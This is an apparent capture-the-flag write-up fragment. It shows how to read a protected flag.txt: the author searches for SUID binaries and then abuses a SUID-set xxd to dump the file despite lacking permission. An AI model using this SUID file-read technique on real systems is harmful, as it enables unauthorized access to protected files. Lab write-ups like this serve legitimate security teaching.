# login in with `password` as password

then we will find that `flag.txt` is own by user `noaccess` and we donot have read
permission.

# privilege escalation

so we would find someway that make us privilege escalation.

```
find / -type f -perm -u=s 2>/dev/null
```

we can find that `/usr/bin/xxd` have been set `suid` which we needed.

```
xxd -ps flag.txt | xxd -r -p
```
